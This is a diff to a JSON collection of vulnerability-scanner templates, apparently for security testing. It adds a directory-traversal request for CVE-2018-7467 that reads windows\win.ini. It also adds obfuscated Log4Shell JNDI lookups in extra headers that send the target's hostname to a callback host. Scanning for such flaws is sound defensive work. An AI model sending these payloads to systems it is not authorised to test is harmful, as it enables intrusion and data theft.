@@ -18639,6 +18639,46 @@
       ]
     },
     {
+      "id": "CVE-2018-7467",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2018-7467",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-200"
+        },
+        "description": "AxxonSoft Axxon Next suffers from a directory traversal vulnerability.",
+        "name": "AxxonSoft Axxon Next Directory Traversal",
+        "reference": [
+          "https://packetstormsecurity.com/files/146604/AxxonSoft-Axxon-Next-Directory-Traversal.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-7467"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,axxonsoft,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "bit app support",
+                "fonts",
+                "extensions"
+              ]
+            }
+          ],
+          "raw": [
+            "GET //css//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\\win.ini HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ],
+          "unsafe": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-7490",
       "info": {
         "author": "madrobot",
@@ -41175,7 +41215,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.{{interactsh-url}}}\nReferer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\n"
+            "GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.{{interactsh-url}}}\nReferer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\nAuthentication: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\n"
           ]
         }
       ]
